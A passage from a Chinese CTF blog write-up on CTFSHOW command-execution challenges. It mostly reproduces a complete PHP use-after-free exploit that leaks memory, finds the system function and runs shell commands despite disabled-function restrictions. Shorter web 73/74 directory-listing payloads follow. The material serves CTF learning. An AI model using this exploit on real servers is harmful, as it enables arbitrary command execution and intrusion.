+    class Helper &#123;
+        public $a, $b, $c, $d;
+    &#125;
+
+    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;
+        $address &#x3D; 0;
+        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;
+            $address &lt;&lt;&#x3D; 8;
+            $address |&#x3D; ord($str[$p+$j]);
+        &#125;
+        return $address;
+    &#125;
+
+    function ptr2str($ptr, $m &#x3D; 8) &#123;
+        $out &#x3D; &quot;&quot;;
+        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;
+            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
+            $ptr &gt;&gt;&#x3D; 8;
+        &#125;
+        return $out;
+    &#125;
+
+    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;
+        $i &#x3D; 0;
+        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;
+            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));
+            $v &gt;&gt;&#x3D; 8;
+        &#125;
+    &#125;
+
+    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;
+        global $abc, $helper;
+        write($abc, 0x68, $addr + $p - 0x10);
+        $leak &#x3D; strlen($helper-&gt;a);
+        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;
+        return $leak;
+    &#125;
+
+    function parse_elf($base) &#123;
+        $e_type &#x3D; leak($base, 0x10, 2);
+
+        $e_phoff &#x3D; leak($base, 0x20);
+        $e_phentsize &#x3D; leak($base, 0x36, 2);
+        $e_phnum &#x3D; leak($base, 0x38, 2);
+
+        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;
+            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;
+            $p_type  &#x3D; leak($header, 0, 4);
+            $p_flags &#x3D; leak($header, 4, 4);
+            $p_vaddr &#x3D; leak($header, 0x10);
+            $p_memsz &#x3D; leak($header, 0x28);
+
+            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; 
+
+                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;
+                $data_size &#x3D; $p_memsz;
+            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; 
+                $text_size &#x3D; $p_memsz;
+            &#125;
+        &#125;
+
+        if(!$data_addr || !$text_size || !$data_size)
+            return false;
+
+        return [$data_addr, $text_size, $data_size];
+    &#125;
+
+    function get_basic_funcs($base, $elf) &#123;
+        list($data_addr, $text_size, $data_size) &#x3D; $elf;
+        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;
+            $leak &#x3D; leak($data_addr, $i * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
+                $deref &#x3D; leak($leak);
+                
+                if($deref !&#x3D; 0x746e6174736e6f63)
+                    continue;
+            &#125; else continue;
+
+            $leak &#x3D; leak($data_addr, ($i + 4) * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
+                $deref &#x3D; leak($leak);
+                
+                if($deref !&#x3D; 0x786568326e6962)
+                    continue;
+            &#125; else continue;
+
+            return $data_addr + $i * 8;
+        &#125;
+    &#125;
+
+    function get_binary_base($binary_leak) &#123;
+        $base &#x3D; 0;
+        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;
+        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;
+            $addr &#x3D; $start - 0x1000 * $i;
+            $leak &#x3D; leak($addr, 0, 7);
+            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;
+                return $addr;
+            &#125;
+        &#125;
+    &#125;
+
+    function get_system($basic_funcs) &#123;
+        $addr &#x3D; $basic_funcs;
+        do &#123;
+            $f_entry &#x3D; leak($addr);
+            $f_name &#x3D; leak($f_entry, 0, 6);
+
+            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;
+                return leak($addr + 8);
+            &#125;
+            $addr +&#x3D; 0x20;
+        &#125; while($f_entry !&#x3D; 0);
+        return false;
+    &#125;
+
+    function trigger_uaf($arg) &#123;
+
+        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+        $vuln &#x3D; new Vuln();
+        $vuln-&gt;a &#x3D; $arg;
+    &#125;
+
+    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
+        die(&#39;This PoC is for *nix systems only.&#39;);
+    &#125;
+
+    $n_alloc &#x3D; 10; 
+    $contiguous &#x3D; [];
+    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)
+        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+
+    trigger_uaf(&#39;x&#39;);
+    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];
+
+    $helper &#x3D; new Helper;
+    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;
+
+    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;
+        die(&quot;UAF failed&quot;);
+    &#125;
+
+    $closure_handlers &#x3D; str2ptr($abc, 0);
+    $php_heap &#x3D; str2ptr($abc, 0x58);
+    $abc_addr &#x3D; $php_heap - 0xc8;
+
+    write($abc, 0x60, 2);
+    write($abc, 0x70, 6);
+
+    write($abc, 0x10, $abc_addr + 0x60);
+    write($abc, 0x18, 0xa);
+
+    $closure_obj &#x3D; str2ptr($abc, 0x20);
+
+    $binary_leak &#x3D; leak($closure_handlers, 8);
+    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;
+        die(&quot;Couldn&#39;t determine binary base address&quot;);
+    &#125;
+
+    if(!($elf &#x3D; parse_elf($base))) &#123;
+        die(&quot;Couldn&#39;t parse ELF header&quot;);
+    &#125;
+
+    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;
+        die(&quot;Couldn&#39;t get basic_functions address&quot;);
+    &#125;
+
+    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;
+        die(&quot;Couldn&#39;t get zif_system address&quot;);
+    &#125;
+
+
+    $fake_obj_offset &#x3D; 0xd0;
+    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;
+        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
+    &#125;
+
+    write($abc, 0x20, $abc_addr + $fake_obj_offset);
+    write($abc, 0xd0 + 0x38, 1, 4); 
+    write($abc, 0xd0 + 0x68, $zif_system); 
+
+    ($helper-&gt;b)($cmd);
+    exit();
+&#125;
+
+ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();
+?&gt;</code></pre>
+
+<p>神奇的脚本，找个时间再看（</p>
+<p>‍</p>
+<h3 id="web-73"><a href="#web-73" class="headerlink" title="web 73"></a>web 73</h3><blockquote>
+<p><code>命令执行，突破禁用函数，求你们别秀了</code></p>
+</blockquote>
+<p>这题和前面基本一致</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">var_export(scandir(&#39;&#x2F;&#39;));exit();</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519160712-20260228215620-0xvihtw.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519160736-20260228215620-o65vo8h.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-74"><a href="#web-74" class="headerlink" title="web 74"></a>web 74</h3><blockquote>
+<p><code>命令执行，突破禁用函数，求你们别秀了</code></p>
+</blockquote>
+<p>这题的 <code>scandir()</code> 找不到东西</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">var_export(glob(&#39;&#x2F;*&#39;));exit();</code></pre>
+
+<blockquote>
+<p><code>glob(&#39;/*&#39;)</code> 用来匹配符合指定模式的路径名</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250519161059-20260228215621-d3d7b0k.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<p>参考</p>
+<p>[ctfshow Web入门<a target="_blank" rel="noopener" href="https://exp10it.io/2022/08/ctfshow-web-exec-29-55-writeup/#web32">命令执行] web29-55 Writeup - X1r0z Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://geekdaxue.co/books/seals6@szn0t2">《ctfshow》 - 极客文档</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Marin</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://wwwmarin.xyz/2025/05/15/ming-ling-zhi-xing/">https://wwwmarin.xyz/2025/05/15/ming-ling-zhi-xing/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Marin</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%88%B7%E9%A2%98/">
+                                    <span class="chip bg-color">刷题</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2025/05/20/php-te-xing/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/1.jpg" class="responsive-img" alt="CTFSHOW-php特性">
+                        
+                        <span class="card-title">CTFSHOW-php特性</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-05-20
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTFSHOW/" class="post-category">
+                                    CTFSHOW
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%88%B7%E9%A2%98/">
+                        <span class="chip bg-color">刷题</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/05/15/ming-ling-zhi-xing/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20240312_124030.jpg" class="responsive-img" alt="CTFSHOW-命令执行">
+                        
+                        <span class="card-title">CTFSHOW-命令执行</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-05-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTFSHOW/" class="post-category">
+                                    CTFSHOW
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%88%B7%E9%A2%98/">
+                        <span class="chip bg-color">刷题</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4, h5, h6'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2026</span>
+            
+            <a href="/about" target="_blank">Marin</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
